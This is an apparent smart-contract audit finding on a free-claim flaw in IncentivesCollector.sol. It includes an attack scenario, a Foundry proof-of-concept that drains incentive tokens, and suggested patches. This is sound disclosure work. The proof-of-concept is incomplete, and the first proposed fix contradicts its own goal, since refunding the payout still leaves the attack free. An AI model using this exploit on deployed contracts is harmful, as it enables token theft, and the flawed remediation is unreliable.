# IncentivesCollector — Free Incentive Tokens When `totalStake == 0`

## Metadata

| Field | Value |
|---|---|
| **Severity** | Medium |
| **Area** | Proof-of-Liquidity / Incentives |
| **Contract** | `IncentivesCollector.sol` |
| **Function** | `_splitAmount` (line 223) + `_claim` (line 167) |
| **File** | `src/pol/IncentivesCollector.sol` |
| **Audited commit** | `70e392fc` (2026-08-11) |

## Description

When the combined stake across the WBERA staker vault and all LST staker vaults
is zero (`totalStake == 0`), `_splitAmount` short-circuits and returns an
all-zero array.  The caller's `payoutAmount` of WBERA is pulled into the contract
but **never distributed** to any vault — it simply accrues to the contract's
WBERA balance.

The caller can then include `WBERA` itself in the `_incentiveTokens` array and
the sweep loop will transfer the **entire** WBERA balance (including the
`payoutAmount` just paid) back to the caller.  Net cost to the attacker: **zero**.
Net gain: every accumulated incentive token in the contract.

```solidity
function _splitAmount(uint256 amount) internal view returns (uint256[] memory amounts) {
    ...
    // 0 edge case: no stakes or no amount to split
    // In this case, claimer will be able to claim all the tokens without paying
    // the payout amount of WBERA.
    // We are aware of this issue …
    if (totalStake == 0 || amount == 0) {
        return amounts;               // ← all zeros; payout NOT distributed
    }
    ...
}
```

```solidity
// Inside _claim, after the (no-op) split:
for (uint256 i; i < _incentiveTokens.length;) {
    address token = _incentiveTokens[i];
    uint256 bal = IERC20(token).balanceOf(address(this));
    IERC20(token).safeTransfer(_recipient, bal);   // ← sweeps WBERA too!
    ...
}
```

The inline comment acknowledges the `totalStake == 0` case but states it is
"not practically possible".  This assessment is **incorrect** for two reasons:

1. **`wberaStakerVault` has no initial supply.** Unlike the LST vaults which are
   seeded, the WBERA staker vault starts empty. If all users unstake (a realistic
   scenario during market stress or migration), `wberaStakerVault.totalAssets()`
   returns 0.

2. **An LST adapter returning `getRate() == 0` nullifies that vault's
   contribution** even if the vault holds assets:
   ```solidity
   uint256 value = (stake * rate) / 1e18;   // rate == 0  →  value == 0
   ```
   A misconfigured or paused adapter (or one whose rate oracle has not yet
   initialised) causes the LST stake to be silently ignored.

When *any* of these conditions coincides with `wberaStakerVault.totalAssets() == 0`,
`totalStake` collapses to zero and the free-claim path opens.

## Attack Scenario

| Step | Actor | Action | Effect |
|---|---|---|---|
| 1 | Condition | All users withdraw from `wberaStakerVault`; LST adapters report rate 0 or are paused | `totalStake == 0` |
| 2 | Attacker | Calls `claim(attacker, [WBERA, USDC, ...allIncentiveTokens])` | `payoutAmount` WBERA pulled in |
| 3 | Contract | `_splitAmount` returns all-zeros | No WBERA sent to any vault |
| 4 | Contract | Sweep loop transfers full WBERA balance (incl. payout) + all other tokens to attacker | Attacker recovers payout + steals incentives |
| 5 | Attacker | Net cost: **0 WBERA**. Net gain: **all accumulated incentive tokens** | |

## Proof of Concept

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {IncentivesCollector} from "src/pol/IncentivesCollector.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FreeClaimPOC is Test {
    IncentivesCollector ic;
    address WBERA = 0x6969696969696969696969696969696969696969;

    function test_freeClaimWhenTotalStakeZero() public {
        // -- Arrange: vaults empty, incentives accrued --
        // deal WBERA and incentive tokens to IncentivesCollector
        deal(WBERA, address(ic), 0);          // no stuck balance yet
        deal(USDC, address(ic), 10_000e6);     // accrued incentives

        // -- Act --
        address attacker = makeAddr("attacker");
        deal(WBERA, attacker, ic.payoutAmount());
        vm.startPrank(attacker);
        IERC20(WBERA).approve(address(ic), ic.payoutAmount());

        address[] memory tokens = new address[](2);
        tokens[0] = WBERA;    // ← recover the payout
        tokens[1] = USDC;     // ← steal incentives

        ic.claim(attacker, tokens);
        vm.stopPrank();

        // -- Assert --
        assertEq(IERC20(USDC).balanceOf(attacker), 10_000e6); // stole all USDC
        assertEq(IERC20(WBERA).balanceOf(attacker), ic.payoutAmount()); // got WBERA back
    }
}
```

## Impact

- **Theft of accumulated incentive tokens.** All tokens held by
  `IncentivesCollector` (incentives redirected from reward vaults) can be
  drained at zero cost whenever `totalStake == 0`.
- **Loss of staker yield.** WBERA stakers and LST stakers receive no payout
  because the WBERA is never distributed to the vaults.
- **Likelihood:** Medium. Requires all vaults to be empty or all LST adapter
  rates to be zero simultaneously. This is plausible during launch, migration,
  or extreme market events (bank-run on the staker vault).

## Three-Perspective Audit

### 1. Attacker perspective
The attack is permissionless and costs only gas. The attacker monitors
`totalStake` (a public view computation) and strikes when it hits zero. The
incentive tokens are stolen instantly; there is no time-delay defence.

### 2. Protocol perspective
The developer comment shows awareness of the edge case, but the mitigation
("not practically possible") is insufficient. The WBERA recovery vector (via
including WBERA in the incentive-token list) is **not** mentioned in the comment
and amplifies the impact from "payout stuck in contract" to "incentives
stolen for free".

### 3. Auditor perspective
Two fixes are needed:
1. **Exclude WBERA** from the incentive-token sweep (or burn excess WBERA if
   `totalStake == 0`).
2. **Refund the payout** to `msg.sender` when `totalStake == 0` so the caller
   cannot profit.

Alternatively, require `totalStake > 0` as a precondition and revert otherwise.

## Recommendation

```solidity
function _claim(address _recipient, address[] calldata _incentiveTokens) internal {
    IERC20(WBERA).safeTransferFrom(msg.sender, address(this), payoutAmount);
    uint256[] memory amounts = _splitAmount(payoutAmount);

+   // Refund undistributed payout when no vaults to receive it
+   if (amounts[0] == 0 && (amounts.length == 1 || _allZero(amounts))) {
+       IERC20(WBERA).safeTransfer(msg.sender, payoutAmount);
+   }

    // ... rest unchanged ...
}
```

Additionally, filter WBERA out of the incentive-token sweep:

```solidity
for (uint256 i; i < _incentiveTokens.length;) {
    address token = _incentiveTokens[i];
+   if (token == WBERA) { unchecked { ++i; } continue; }   // never sweep payout token
    ...
}
```
